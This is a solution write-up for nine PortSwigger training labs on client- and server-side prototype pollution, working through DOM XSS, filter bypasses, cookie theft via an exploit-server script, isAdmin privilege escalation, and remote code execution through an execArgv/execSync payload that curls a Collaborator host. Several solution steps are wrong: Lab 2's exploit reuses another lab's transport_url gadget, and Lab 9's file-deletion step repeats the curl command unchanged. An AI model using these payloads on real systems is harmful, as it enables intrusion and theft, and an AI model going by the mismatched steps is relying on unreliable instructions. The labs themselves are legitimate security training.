## Labs Covered

This write-up focuses on the following **PRACTITIONER-level labs** from the PortSwigger Web Security Academy related to **Prototype Pollution**:

**1 Client-side prototype pollution via browser APIs**  
<blockquote>
This lab demonstrates how attackers can pollute JavaScript object prototypes using browser APIs to influence client-side behavior.
</blockquote>

**2 DOM XSS via client-side prototype pollution**  
<blockquote>
This lab shows how prototype pollution can be leveraged to achieve DOM-based Cross-site Scripting (XSS).
</blockquote>

**3 DOM XSS via an alternative prototype pollution vector**  
<blockquote>
This lab demonstrates achieving DOM XSS through less common prototype pollution vectors.
</blockquote>

**4 Client-side prototype pollution via flawed sanitization**  
<blockquote>
This lab explores how flawed sanitization can allow prototype pollution attacks on the client side.
</blockquote>

**5 Client-side prototype pollution in third-party libraries**
<blockquote>
This lab covers prototype pollution vulnerabilities introduced by insecure third-party JavaScript libraries.
</blockquote>

**6 Privilege escalation via server-side prototype pollution**  
<blockquote>
This lab demonstrates how attackers can leverage prototype pollution on the server side to escalate privileges.
</blockquote>

**7 Detecting server-side prototype pollution without polluted property reflection**  
<blockquote>
This lab shows how attackers can identify server-side prototype pollution even when the application does not reflect polluted properties.
</blockquote>

**8 Bypassing flawed input filters for server-side prototype pollution**  
<blockquote>
This lab demonstrates bypassing input validation filters to exploit server-side prototype pollution vulnerabilities.
</blockquote>

**9 Remote code execution via server-side prototype pollution**  
<blockquote>
This lab demonstrates how server-side prototype pollution can lead directly to remote code execution.
</blockquote>

---

### LAB 1 - Client-side prototype pollution via browser APIs

### Lab Description

<img width="869" height="514" alt="image" src="https://github.com/user-attachments/assets/79fc4664-250d-42a5-8cce-13bfeecc2418" />

### Solution



### Find a prototype pollution source

1. In your browser, try polluting `Object.prototype` by injecting an arbitrary property via the query string:
   `/?__proto__[foo]=bar`
2. Open the browser DevTools panel and go to the **Console** tab.
3. Enter `Object.prototype`.
   Study the properties of the returned object and observe that your injected `foo` property has been added. You've successfully found a prototype pollution source.

   <img width="1673" height="823" alt="image" src="https://github.com/user-attachments/assets/d4718432-9688-4500-ba6c-1df03df86c68" />


---

### Identify a gadget

1. In the browser DevTools panel, go to the **Sources** tab.
2. Study the JavaScript files that are loaded by the target site and look for any DOM XSS sinks.
3. In `searchLoggerConfigurable.js`, notice that if the `config` object has a `transport_url` property, this is used to dynamically append a script to the DOM.
4. Observe that a `transport_url` property is defined for the `config` object, so this doesn't appear to be vulnerable.
5. Observe that the next line uses the `Object.defineProperty()` method to make the `transport_url` **unwritable** and **unconfigurable**. However, notice that it doesn't define a `value` property.

     <img width="1672" height="808" alt="image" src="https://github.com/user-attachments/assets/22e511cd-66b6-4b9f-a2b3-c832f59bab4f" />


---

### Craft an exploit

1. Using the prototype pollution source you identified earlier, try injecting an arbitrary `value` property:
   `/?__proto__[value]=foo`
2. In the browser DevTools panel, go to the **Elements** tab and study the HTML content of the page.
   Observe that a `<script>` element has been rendered on the page, with the `src` attribute set to `foo`.

    <img width="1483" height="805" alt="image" src="https://github.com/user-attachments/assets/b10d3a18-14c3-408f-b591-97b084819dd0" />

Modify the payload in the URL to inject an XSS proof-of-concept. For example, you can use a `data:` URL as follows:
`/?__proto__[value]=data:,alert(1);`

Observe that `alert(1)` is called and the lab is solved.

  <img width="1394" height="405" alt="image" src="https://github.com/user-attachments/assets/01a4d0c6-9114-42d8-9fa7-a07563b6fff7" />

---

### DOM Invader solution:

Load the lab in Burp's built-in browser.
Enable DOM Invader and enable the **prototype pollution** option.

<img width="1841" height="676" alt="image" src="https://github.com/user-attachments/assets/82936301-872a-45cc-8995-bcc230ce6a00" />


Open the browser DevTools panel, go to the **DOM Invader** tab, then reload the page.
Observe that DOM Invader has identified two prototype pollution vectors in the `search` property (i.e. the query string).

Click on the test to see the prototype source.

<img width="1517" height="275" alt="image" src="https://github.com/user-attachments/assets/4e33ee39-f920-47f2-adfa-19984891eb9b" />


Now we can see the prototype source after clicking on the test.

<img width="1637" height="956" alt="image" src="https://github.com/user-attachments/assets/e98d3531-a211-4de7-a020-f29a6ca25bd8" />


Click **Scan** for gadgets. A new tab opens in which DOM Invader begins scanning for gadgets using the selected source.

<img width="1516" height="272" alt="image" src="https://github.com/user-attachments/assets/8a956213-d6e8-4c06-b109-416e756bb880" />


When the scan is complete, open the DevTools panel in the same tab as the scan, then go to the **DOM Invader** tab.
Observe that DOM Invader has successfully accessed the `script.src` sink via the `value` gadget.
Click **Exploit**. DOM Invader automatically generates a proof-of-concept exploit and calls `alert(1)`.

<img width="1895" height="908" alt="image" src="https://github.com/user-attachments/assets/782b9e6d-2d2b-4c07-84d0-b884369308ab" />

We can see the above payload url encoded we decode  to see the payload

<img width="1920" height="545" alt="image" src="https://github.com/user-attachments/assets/3bd4dcb6-77e1-4ddf-a65b-2aca3e06afe4" />

The lab is solved after the alert.

<img width="1774" height="331" alt="image" src="https://github.com/user-attachments/assets/0697156f-b12f-49cb-9c58-e8e39e7f9864" />



---

### LAB 3 - DOM XSS via an alternative prototype pollution vector

### Lab Description

<img width="834" height="565" alt="image" src="https://github.com/user-attachments/assets/5de6b8f6-7bed-4b33-ad1f-28a963c608d6" />

### Solution
### Find a prototype pollution source
 1. In your browser, try polluting Object.prototype by injecting an arbitrary property via the query string:
`/?__proto__[foo]=bar`

2. Open the browser DevTools panel and go to the **Console** tab.
3. Enter **Object.prototype**.
4. Study the properties of the returned object. Observe that it now has a **foo property with the value bar**. You've successfully found a prototype pollution source.

<img width="1030" height="794" alt="image" src="https://github.com/user-attachments/assets/89b5ab5d-5454-45a2-8970-0104b4c9a6c2" />

### Identify a gadget:
1 In the browser DevTools panel, go to the **Sources** tab.
2 Study the JavaScript files that are loaded by the target site and look for any DOM XSS sinks.
3 In searchLogger.js, notice that if the config object has a **transport_url** property, this is used to dynamically append a script to the DOM.
4 Notice that no transport_url property is defined for the config object. This is a potential gadget for controlling the src of the **<script>** element.

<img width="1125" height="914" alt="image" src="https://github.com/user-attachments/assets/cf9f00ad-716e-44b0-bf90-8b93a1a88b72" />

### Craft an exploit
 1. Using the prototype pollution source you identified earlier, try injecting an arbitrary **transport_url** property:
     `/?__proto__[transport_url]=foo`
 2. In the browser DevTools panel, go to the Elements tab and study the HTML content of the page. Observe that a <script> element has been rendered on the page, with the src attribute foo

<img width="764" height="358" alt="image" src="https://github.com/user-attachments/assets/cc236bf9-9196-425f-8f68-ac8fa22aab71" />
     
Modify the payload in the URL to inject an XSS proof-of-concept. For example, you can use a data: URL as follows:
     `/?__proto__[transport_url]=data:,alert(1);`
<img width="1380" height="270" alt="image" src="https://github.com/user-attachments/assets/b26e7614-dedc-42e4-ac71-ba6c491cc624" />

### DOM Invader solution:
Open the lab in Burp's built-in browser.**Enable DOM Invader** and enable the prototype pollution option.

<img width="614" height="590" alt="image" src="https://github.com/user-attachments/assets/7ab64385-3ecc-4eaa-baf8-b5dce6152c7d" />

Observe that DOM Invader has identified two prototype pollution vectors in the search property i.e. the query string.
And **Click Scan** for gadgets. A new tab opens in which DOM Invader begins scanning for gadgets using the selected source


<img width="1894" height="485" alt="image" src="https://github.com/user-attachments/assets/f2f89f7b-e81a-46b1-9243-a30a784a2d2d" />

 When the scan is complete, open the DevTools panel in the same tab as the scan, then go to the **DOM Invader** tab.

  
   <img width="1394" height="128" alt="image" src="https://github.com/user-attachments/assets/0050d576-1f19-4dbe-9018-eb995d183d9c" />

   Observe that DOM Invader has successfully accessed the script.src sink via the **transport_url** gadget.
  And then **lick Exploit**. DOM Invader automatically generates a proof-of-concept exploit and calls `alert(1)`.

<img width="1870" height="340" alt="image" src="https://github.com/user-attachments/assets/39dfc039-f028-4279-9328-50675c3ccc0b" />

Clicking on expliot generate alert.

<img width="1326" height="257" alt="image" src="https://github.com/user-attachments/assets/41ccb161-87a5-4507-a323-04e167c8904b" />

 And after one is alert lab is solved.

<img width="1692" height="352" alt="image" src="https://github.com/user-attachments/assets/ab0cb12d-6fbb-4554-b29f-984cc6692f72" />


---
### LAB 2 - DOM XSS via client-side prototype pollution

### Lab Description

<img width="866" height="358" alt="image" src="https://github.com/user-attachments/assets/5c2caa05-3a22-4888-b7e7-29fc079fbe1f" />

### Solution

## Find a prototype pollution source

1. In your browser, try polluting `Object.prototype` by injecting an arbitrary property via the query string:
   `/?__proto__[foo]=bar`
 
 <img width="979" height="377" alt="image" src="https://github.com/user-attachments/assets/4137188f-f2a1-4560-866b-2722d08e5196" />

2. Open the browser DevTools panel and go to the **Console** tab.

3. Enter `Object.prototype`.

4. Study the properties of the returned object and observe that your injected `foo` property has not been added.

   <img width="1030" height="794" alt="image" src="https://github.com/user-attachments/assets/def936c3-c618-4a55-b90d-470163a4723d" />


5. Back in the query string, try using an alternative prototype pollution vector:
   `/?__proto__.foo=bar`

6. In the console, enter `Object.prototype` again. Notice that it now has its own `foo` property with the value `bar`. You've successfully found a prototype pollution source.

7. In the console, enter `Object.prototype` again. Notice that it now has its own `foo` property with the value `bar`. You've successfully found a prototype pollution source.

---

### Identify a gadget

1. In the browser DevTools panel, go to the **Sources** tab.
2. Study the JavaScript files that are loaded by the target site and look for any DOM XSS sinks.
3. Notice that there is an `eval()` sink in `searchLoggerAlternative.js`.
4. Notice that the `manager.sequence` property is passed to `eval()`, but this isn't defined by default.

<img width="1125" height="914" alt="image" src="https://github.com/user-attachments/assets/a7be5a35-2c15-46b3-8d41-5e46356825c7" />

---

### Craft an exploit

 1. Using the prototype pollution source you identified earlier, try injecting an arbitrary transport_url property:
    `/?__proto__[transport_url]=foo`
 2 In the browser DevTools panel, go to the Elements tab and study the HTML content of the page. Observe that a <script> element has been rendered on the page, with the src attribute foo.

<img width="764" height="358" alt="image" src="https://github.com/user-attachments/assets/e1eab9f0-47d8-455c-add5-610ac04a78b8" />



Modify the payload in the URL to inject an XSS proof-of-concept. For example, you can use a data: URL as follows:
`/?__proto__[transport_url]=data:,alert(1);`
Observe that the alert(1) is called and the lab is solved.

<img width="1380" height="270" alt="image" src="https://github.com/user-attachments/assets/f3155abc-ba49-4cb9-aa08-69ecae64ff29" />

---

### DOM Invader solution

1. Load the lab in Burp's built-in browser.
2. Enable DOM Invader and enable the **prototype pollution** option.
3. Open the browser DevTools panel, go to the **DOM Invader** tab, and reload the page.

  <img width="614" height="590" alt="image" src="https://github.com/user-attachments/assets/f2d77a61-aece-440a-b22d-2916b8d767a6" />


Observe that DOM Invader has identified a prototype pollution vector in the `search` property, i.e., the query string.
Click **Scan for gadgets**. A new tab opens in which DOM Invader begins scanning for gadgets using the selected source.

<img width="1894" height="485" alt="image" src="https://github.com/user-attachments/assets/28409953-d775-450a-b40f-af31caf0d762" />

When the scan is complete, open the DevTools panel in the same tab as the scan, then go to the **DOM Invader** tab.

<img width="1631" height="284" alt="image" src="https://github.com/user-attachments/assets/1f13ecf6-fdfd-466c-b411-e6e75110d160" />

<img width="1394" height="128" alt="image" src="https://github.com/user-attachments/assets/74f1ef30-36df-4a41-808d-c968be10f1ed" />

Observe that DOM Invader has successfully accessed the `eval()` sink via the `sequence` gadget.
Click **Exploit**. Observe that DOM Invader's auto-generated proof-of-concept doesn't trigger an `alert()`.


<img width="1308" height="233" alt="image" src="https://github.com/user-attachments/assets/c6780251-4d0c-4091-8b51-e96bdc074c0b" />
Decode the exploit find in dom invader.

<img width="1912" height="496" alt="image" src="https://github.com/user-attachments/assets/0fd28a8d-f87f-4433-9465-6c07f9837fca" />

 
Now follow all the Step of manual in which used delimentor to exclude the part 0f 1 and generate alert

<img width="448" height="224" alt="image" src="https://github.com/user-attachments/assets/ba8862c0-9eea-45e1-bd04-59c477393ca3" />

---

### LAB 4 - Client-side prototype pollution via flawed sanitization

### Lab Description

<img width="842" height="429" alt="image" src="https://github.com/user-attachments/assets/d1be83e0-4130-4b5c-87fb-c8032433aa86" />

### Solution

### Find a prototype pollution source



In your browser, try polluting `Object.prototype` by injecting an arbitrary property via the query string:
`/?__proto__[foo]=bar`
Open the browser DevTools panel and go to the **Console** tab.
Enter `Object.prototype`.
Study the properties of the returned object and observe that your injected `foo` property has not been added.

Try alternative prototype pollution vectors. For example:

* `/?__proto__.foo=bar`
* `/?constructor.prototype.foo=bar`

Observe that in each instance, `Object.prototype` is not modified.

<img width="1070" height="397" alt="image" src="https://github.com/user-attachments/assets/8f674704-ae63-4980-84af-ccb3b0cbeb32" />

Using other prototype pollution


<img width="1200" height="420" alt="image" src="https://github.com/user-attachments/assets/aa0694cb-ccc4-4ccc-944e-0e482ab627e0" />

---

### Using other prototype pollution vectors

Go to the **Sources** tab and study the JavaScript files that are loaded by the target site.


Notice that `deparamSanitized.js` uses the `sanitizeKey()` function defined in `searchLoggerFiltered.js` to strip potentially dangerous property keys based on a blocklist. However, it does **not** apply this filter recursively.

Back in the URL, try injecting one of the blocked keys in such a way that the dangerous key remains after the sanitization process. For example:

<img width="1920" height="814" alt="image" src="https://github.com/user-attachments/assets/70529015-7469-457a-94ae-73a15f57eeb3" />


```bash
/?__pro__proto__to__[foo]=bar
/?__pro__proto__to__.foo=bar
/?constconstructorructor[protoprototypetype][foo]=bar
/?constconstructorructor.protoprototypetype.foo=bar
```

In the console, enter `Object.prototype` again.
Notice that it now has its own `foo` property with the value `bar`. You've successfully found a prototype pollution source and bypassed the website's key sanitization.

The first prototype works for us.

<img width="1264" height="574" alt="image" src="https://github.com/user-attachments/assets/2b2c1193-11fd-4809-b9d1-ed21eba21aec" />


---

### Identify a gadget

Study the JavaScript files again and notice that `searchLogger.js` dynamically appends a script to the DOM using the config object's `transport_url` property, if present.
Notice that no `transport_url` property is set for the config object — this is a potential gadget.

<img width="1859" height="799" alt="image" src="https://github.com/user-attachments/assets/4efd17bf-b6ef-4eb1-b46a-90b573c21a94" />


Using the prototype pollution source you identified earlier, try injecting an arbitrary `transport_url` property:
`/?__pro__proto__to__[transport_url]=foo`

In the browser DevTools panel, go to the **Elements** tab and study the HTML content of the page.
Observe that a `<script>` element has been rendered on the page, with the `src` attribute set to `foo`.

<img width="1180" height="887" alt="image" src="https://github.com/user-attachments/assets/11edfb90-be8a-4821-ac3b-32ab031c7168" />


Modify the payload in the URL to inject an XSS proof-of-concept.
For example, you can use a data: URL as follows:
`/?__pro__proto__to__[transport_url]=data:,alert(1);`

<img width="1749" height="344" alt="image" src="https://github.com/user-attachments/assets/20a7d0ca-f37b-4030-9109-49e6b65851db" />


Observe that the `alert(1)` is called and the lab is solved.

---

### LAB 5 - Client-side prototype pollution in third-party libraries

### Lab Description
<img width="854" height="566" alt="image" src="https://github.com/user-attachments/assets/93f2c2c6-f2ee-4290-8c63-8f7ae2f46eeb" />

### Solution



Load the lab in Burp's built-in browser.

<img width="673" height="515" alt="image" src="https://github.com/user-attachments/assets/f32c042e-4752-47a4-98cc-04e8ee054827" />

Enable DOM Invader and enable the prototype pollution option.

Open the browser DevTools panel, go to the **DOM Invader** tab, then reload the page.
Observe that DOM Invader has identified two prototype pollution vectors in the `hash` property, i.e., the URL fragment string.
Now click on **test** to see the source of the prototype pollution that we have found.

<img width="1800" height="366" alt="image" src="https://github.com/user-attachments/assets/a442cbb3-f88f-46a6-8b67-8317f2d6d500" />


As we can see in blue, we have found the source of prototype pollution.

<img width="1515" height="529" alt="image" src="https://github.com/user-attachments/assets/3a8f9fa0-eea6-4707-80e7-c75b10a0b85d" />


We also tested the same prototype above in the browser instance of Burp’s DOM Invader browser.
<img width="1868" height="848" alt="image" src="https://github.com/user-attachments/assets/6cfd7684-f3c3-4a4b-8d80-0caa46ce26fd" />


After that, we clicked on **Scan Gadget**.
When the scan is complete, open the DevTools panel in the same tab as the scan, then go to the **DOM Invader** tab.
Observe that DOM Invader has successfully accessed the `setTimeout()` sink via the `hitCallback` gadget.
Click **Exploit**. DOM Invader automatically generates a proof-of-concept exploit and calls `alert(1)`.

<img width="1879" height="803" alt="image" src="https://github.com/user-attachments/assets/38bb2b10-da9a-4a89-963c-682badbce1e9" />


We can see that clicking **Exploit** gives us the gadget to exploit and generates the alert.

<img width="1324" height="276" alt="image" src="https://github.com/user-attachments/assets/1e99fdef-6bbd-461b-9f37-4d9f4a4873c9" />


Disable DOM Invader.
In the browser, go to the lab's **Exploit Server**.
In the **Body** section, craft an exploit that will navigate the victim to a malicious URL as follows:

```html
<script>
location="https://YOUR-LAB-ID.web-security-academy.net/#__proto__[hitCallback]=alert(document.cookie)"
</script>
```

Test the exploit on yourself, making sure that you're navigated to the lab's home page and that the `alert(document.cookie)` payload is triggered.

<img width="1675" height="377" alt="image" src="https://github.com/user-attachments/assets/4d6c9f9f-755a-48ca-90e8-11dee6fa8756" />


It triggered the alert in the test, but not when I delivered it — the lab was not solved.

<img width="1218" height="818" alt="image" src="https://github.com/user-attachments/assets/0a2db0d0-ee42-4f37-aed0-55e79d889e57" />


So, I URL-encoded the bracketed payload, delivered it to the victim, and then the lab was solved.

<img width="1220" height="344" alt="image" src="https://github.com/user-attachments/assets/d9797363-e024-42bf-bece-5b551e2002ea" />

And the lab is solved. 

<img width="1515" height="358" alt="image" src="https://github.com/user-attachments/assets/dec0d4d3-33af-40ee-8497-2d0c0154bf49" />


---

### LAB 6 - Privilege escalation via server-side prototype pollution

### Lab Description

<img width="883" height="768" alt="image" src="https://github.com/user-attachments/assets/720a1a38-2524-46a8-aa90-2953436dffc6" />

### Solution



### Study the address change feature

Log in and visit your account page. Submit the form for updating your billing and delivery address.
In Burp, go to the **Proxy > HTTP history** tab and find the `POST /my-account/change-address` request.
Observe that when you submit the form, the data from the fields is sent to the server as JSON.
Notice that the server responds with a JSON object that appears to represent your user. This has been updated to reflect your new address information.
Send the request to Burp Repeater.

<img width="1670" height="692" alt="image" src="https://github.com/user-attachments/assets/9be6b049-32a5-41de-96f9-b716464e8d3d" />


After logging in, we can see the page below.

<img width="1399" height="881" alt="image" src="https://github.com/user-attachments/assets/a63f2f0d-8616-4801-9064-7828a33c1a37" />


Change the country to *Pak* and submit it.

<img width="1489" height="893" alt="image" src="https://github.com/user-attachments/assets/f2327d76-24fb-4c98-81eb-dac2efcf2664" />


Below we can see the information after updating the country.

<img width="1485" height="839" alt="image" src="https://github.com/user-attachments/assets/8e440a45-bcb4-4f9b-a2bd-d9eb16d9059e" />


In Burp, go to the **Proxy > HTTP history** tab and find the `POST /my-account/change-address` request.
Observe that when you submit the form, the data from the fields is sent to the server as JSON.
Notice that the server responds with a JSON object that appears to represent your user. This has been updated to reflect your new address information.

<img width="1583" height="459" alt="image" src="https://github.com/user-attachments/assets/03e51154-a08f-4d1e-b04b-8bc3478f6377" />


Below we can see the request sent to Repeater.

<img width="1457" height="781" alt="image" src="https://github.com/user-attachments/assets/23aaa40a-a58a-4f73-81ab-540908f84832" />

<img width="1437" height="706" alt="image" src="https://github.com/user-attachments/assets/a30a299d-230d-451c-8c08-70294fb314a8" />

---

### Identify a prototype pollution source

In Repeater, add a new property to the JSON with the name `__proto__`, containing an object with an arbitrary property:

```json
"__proto__": {
  "foo": "bar"
}
```

Send the request.
Notice that the object in the response now includes the arbitrary property that you injected, but **no `__proto__`** property.
This strongly suggests that you have successfully polluted the object's prototype and that your property has been inherited via the prototype chain.

<img width="1467" height="727" alt="image" src="https://github.com/user-attachments/assets/acfba22b-16cf-4f73-ba40-3d6d0f2e6d83" />


---

### Identify a gadget

1. Look at the additional properties in the response body.
2. Notice the `isAdmin` property, which is currently set to `false`.

     <img width="1362" height="543" alt="image" src="https://github.com/user-attachments/assets/0d67d652-5ce2-4dc2-a0e1-0e998f57464b" />


---

### Craft an exploit

1. Modify the request to try polluting the prototype with your own `isAdmin` property:

```json
"__proto__": {
  "isAdmin": true
}
```

2. Send the request. Notice that the `isAdmin` value in the response has been updated.
   This suggests that the object doesn't have its own `isAdmin` property but has instead inherited it from the polluted prototype.

**Note**: Remember to add a comma to close the `sessionID`.

<img width="1440" height="642" alt="image" src="https://github.com/user-attachments/assets/575f0f0f-7f3f-4aeb-83ac-341c3fbb59ae" />


****

In the browser, refresh the page and confirm that you now have a link to access the admin panel.

<img width="872" height="476" alt="image" src="https://github.com/user-attachments/assets/134c2f06-c4dc-41f0-b669-31b37531dc3a" />


Go to the admin panel and delete **carlos** to solve the lab. 

<img width="1494" height="466" alt="image" src="https://github.com/user-attachments/assets/0307b20e-8940-4e9a-9c4d-4ca29a46d604" />


---

### LAB 7 - Detecting server-side prototype pollution without polluted property reflection

### Lab Description
<img width="874" height="655" alt="image" src="https://github.com/user-attachments/assets/c6205e91-6680-4f86-8d8e-b24b4d3e7cce" />

### Solution


Log in and visit your account page.

<img width="1550" height="688" alt="image" src="https://github.com/user-attachments/assets/5ed44b8c-364f-4ad1-875a-c3b76982f652" />


Submit the form for updating your billing and delivery address.

<img width="1288" height="805" alt="image" src="https://github.com/user-attachments/assets/fe8ce2bb-5afa-4c0c-8bda-020921dde24b" />
<img width="1580" height="875" alt="image" src="https://github.com/user-attachments/assets/00721157-847d-4e4c-8176-b7115970b7fc" />



**Updated account**


In Burp, go to the **Proxy > HTTP history** tab and find the `POST /my-account/change-address` request. Send it to Repeater.

<img width="1755" height="827" alt="image" src="https://github.com/user-attachments/assets/34ee92af-93b3-4d53-b3fa-79b1aedfeaa7" />


In Repeater, add a new property to the JSON with the name `__proto__`, containing an object with an arbitrary property:

Send the request. Observe that the object in the response does not reflect the injected property. However, this doesn't necessarily mean that the application isn't vulnerable to prototype pollution.

 <img width="1346" height="502" alt="image" src="https://github.com/user-attachments/assets/c01000cc-362f-4092-a427-9b5ffc018112" />

---

### Identify a prototype pollution source

In the request, modify the JSON in a way that intentionally breaks the syntax. For example, delete a comma from the end of one of the lines.
Send the request. Observe that you receive an error response in which the body contains a JSON error object.
Notice that although you received a **500 error** response, the error object contains a `status` property with the value `400`.

<img width="1447" height="616" alt="image" src="https://github.com/user-attachments/assets/b373a4b3-3a7c-456a-8607-247a4299b906" />

In the request, make the following changes:

* Fix the JSON syntax by reversing the changes that triggered the error.
* Modify your injected property to try polluting the prototype with your own distinct `status` property. Remember that this must be between **400** and **599**.


  <img width="337" height="140" alt="image" src="https://github.com/user-attachments/assets/e1f871ed-94dd-430a-a79a-d2e3a7e205a9" />

   <img width="1447" height="636" alt="image" src="https://github.com/user-attachments/assets/19288465-4335-44c4-9775-31f8312e715d" />


1. Send the request and confirm that you receive the normal response containing your user object.
2. Intentionally break the JSON syntax again and reissue the request (we removed the comma from `sessionID`).

**Notice that this time**, although you triggered the same error, the `status` and `statusCode` properties in the JSON response match the arbitrary error code that you injected into `Object.prototype`.
This strongly suggests that you have successfully polluted the prototype and the lab is solved. 

<img width="1456" height="656" alt="image" src="https://github.com/user-attachments/assets/5872f7d5-5d74-4738-b707-1c61ef0f4a9b" />

<img width="1704" height="518" alt="image" src="https://github.com/user-attachments/assets/9e3d3e75-d640-4295-bf7a-fa641fb8e312" />

  
---

### LAB 8 - Bypassing flawed input filters for server-side prototype pollution

### Lab Description

<img width="873" height="755" alt="image" src="https://github.com/user-attachments/assets/73b414f8-1bc6-4397-89e3-d6a7d4af4e47" />

### Solution



### Study the address change feature

Log in and visit your account page.

<img width="1669" height="709" alt="image" src="https://github.com/user-attachments/assets/2a9c14f8-f1d1-4a16-8781-f4f03518347a" />


Submit the form for updating your billing and delivery address.

<img width="1658" height="794" alt="image" src="https://github.com/user-attachments/assets/62ee6e0f-5e9d-43d1-a527-2a457112eab3" />


In Burp, go to the **Proxy > HTTP history** tab and find the `POST /my-account/change-address` request.
Observe that when you submit the form, the data from the fields is sent to the server as JSON.
Notice that the server responds with a JSON object that appears to represent your user. This has been updated to reflect your new address information.
Send the request to Burp Repeater.

<img width="1577" height="829" alt="image" src="https://github.com/user-attachments/assets/5061046f-3e4a-4e06-9cbe-20a5b5bff671" />

Now we have used the payload, but it is reflected in the response.

<img width="1448" height="651" alt="image" src="https://github.com/user-attachments/assets/4c867925-8ff8-4cf7-9bd2-1dc06958405f" />


---

### Identify a prototype pollution source

In Repeater, add a new property to the JSON with the name `__proto__`, containing an object with a `json spaces` property:
`"__proto__": { "json spaces": 10 }`
The response remains unaffected.

<img width="1436" height="618" alt="image" src="https://github.com/user-attachments/assets/f8407e5a-29b1-4de4-b760-c8e80e09e7aa" />

Modify the request to try polluting the prototype via the `constructor` property instead:

```json
"constructor": {
  "prototype": {
    "json spaces": 10
  }
}
```

Resend the request.
In the Response panel, go to the **Raw** tab.
This time, notice that the JSON indentation has increased based on the value of your injected property.
This strongly suggests that you have successfully polluted the prototype.

<img width="1435" height="619" alt="image" src="https://github.com/user-attachments/assets/24c2faf0-ebb6-441b-bac8-d4efc4245a7b" />


---

### Identify a gadget

1. Look at the additional properties in the response body.
2. Notice the `isAdmin` property, which is currently set to `false`.

---

### Craft an exploit

1. Modify the request to try polluting the prototype with your own `isAdmin` property:

```json
"constructor": {
  "prototype": {
    "isAdmin": true
  }
}
```

2. Send the request.
   Notice that the `isAdmin` value in the response has been updated.
   This suggests that the object doesn't have its own `isAdmin` property but has instead inherited it from the polluted prototype.

   <img width="1445" height="672" alt="image" src="https://github.com/user-attachments/assets/bb839bec-7e09-4f63-b43b-04eb5ca49fe6" />


In the browser, refresh the page and confirm that you now have a link to access the admin panel.
Go to the admin panel and delete Carlos to solve the lab. 

<img width="1662" height="489" alt="image" src="https://github.com/user-attachments/assets/44592bd6-11c3-4efc-8fd7-0244c0b3ebc3" />


---

### LAB 9 - Remote code execution via server-side prototype pollution

### Lab Description

<img width="771" height="864" alt="image" src="https://github.com/user-attachments/assets/4e6b21e6-0c97-44e7-b2ba-11375d643ad2" />

### Solution

Here’s your write-up with corrected grammar and syntax — content has not been changed:

---

### Study the address change feature

1. Log in and visit your account page.

<img width="1558" height="671" alt="image" src="https://github.com/user-attachments/assets/f0dfadd3-1650-484b-b8e3-aeb5d50f0292" />

Submit the form for updating your billing and delivery address.

<img width="1539" height="831" alt="image" src="https://github.com/user-attachments/assets/b3121aaf-0dc2-4f25-96c8-99b3a267fdd6" />

In Burp, go to the **Proxy > HTTP history** tab and find the `POST /my-account/change-address` request.
Observe that when you submit the form, the data from the fields is sent to the server as JSON.
Notice that the server responds with a JSON object that appears to represent your user. This has been updated to reflect your new address information.
Send the request to Burp Repeater.

<img width="1912" height="677" alt="image" src="https://github.com/user-attachments/assets/bc3d03e7-6c57-41d0-b87a-b9b8bb1480af" />

---

### Identify a prototype pollution source

1. In Repeater, add a new property to the JSON with the name `__proto__`, containing an object with a `json spaces` property:

```json
"__proto__": {
  "foo": "bar"
}
```

OR

```json
"__proto__": {
  "json spaces": 10
}
```

Send the request.

In the response, see that `"bar"` is injected, confirming prototype pollution.

<img width="1452" height="670" alt="image" src="https://github.com/user-attachments/assets/d3c64092-59aa-42ae-91f5-a0cfa95a3387" />



---

### Probe for remote code execution

In the browser, go to the **admin panel** and observe that there's a button for running maintenance jobs.

<img width="1553" height="377" alt="image" src="https://github.com/user-attachments/assets/90babe22-3b59-42ea-bfde-bbbac4bd6850" />


Click the button and observe that this triggers background tasks that clean up the database and filesystem.
This is a classic example of functionality that may spawn Node.js child processes.

<img width="1738" height="433" alt="image" src="https://github.com/user-attachments/assets/9669a3f1-66fc-4baf-b36f-b1eac2e2c757" />

After clicking **Maintenance**, the page below will show up.

<img width="1487" height="480" alt="image" src="https://github.com/user-attachments/assets/7f2e7c3d-8591-48af-8b1c-dc30558b04fb" />


We can also see the HTTP request of the maintenance job in the below image.

<img width="913" height="529" alt="image" src="https://github.com/user-attachments/assets/e50adeb6-ba88-43b2-8ec4-64c8273a9b3c" />


Try polluting the prototype with a malicious `execArgv` property that adds the `--eval` argument to the spawned child process.
Use this to call the `execSync()` sink, passing in a command that triggers an interaction with the public Burp Collaborator server.
For example:

```json
"__proto__": {
  "execArgv": [
    "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
  ]
}
```

Send the request.

<img width="1458" height="633" alt="image" src="https://github.com/user-attachments/assets/baab9e06-e63c-4d0d-a010-b5dd1a8443e6" />



In the browser, go to the **admin panel** and trigger the maintenance jobs again.

Notice that these jobs have both failed this time.

In Burp, go to the **Collaborator tab** and poll for interactions.
Observe that you have received several DNS interactions, confirming remote code execution.

<img width="1506" height="832" alt="image" src="https://github.com/user-attachments/assets/73bcfaa7-b131-4a88-8fdc-908b8c55a159" />

---

### Craft an exploit

1. In Repeater, replace the `curl` command with a command to delete Carlos’s file:

```json
"__proto__": {
  "execArgv": [
    "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
  ]
}
```

Send the request.
<img width="1458" height="633" alt="image" src="https://github.com/user-attachments/assets/954ffbde-6c9f-4a72-b2ad-5bd77723885c" />


Go back to the **admin panel** and trigger the maintenance jobs again.

<img width="1553" height="377" alt="image" src="https://github.com/user-attachments/assets/ccccd0f5-ab7b-497e-94ee-0bf1d816f57a" />

Carlos’s file is deleted and the lab is solved.

---

**Lab is solved.**


<img width="1556" height="528" alt="image" src="https://github.com/user-attachments/assets/4c957167-e980-498c-a8ae-7b9e780917c4" />

---

